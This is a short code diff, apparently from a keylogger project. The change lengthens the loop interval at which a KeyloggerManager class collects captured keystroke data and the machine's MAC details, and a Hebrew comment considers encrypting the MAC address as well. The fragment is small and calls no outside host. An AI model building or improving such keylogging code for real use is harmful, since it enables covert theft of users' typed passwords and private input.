@@ -21,7 +21,7 @@ class KeyloggerManager:
     def main(self) ->None:
         while self.active:
             try:
-                time.sleep(10)
+                time.sleep(30)
                 data = self.keylogger.data
                 # אולי עדיף להצפין גם את הכתובת מאק
                 mac_name = self.get_mac_details()
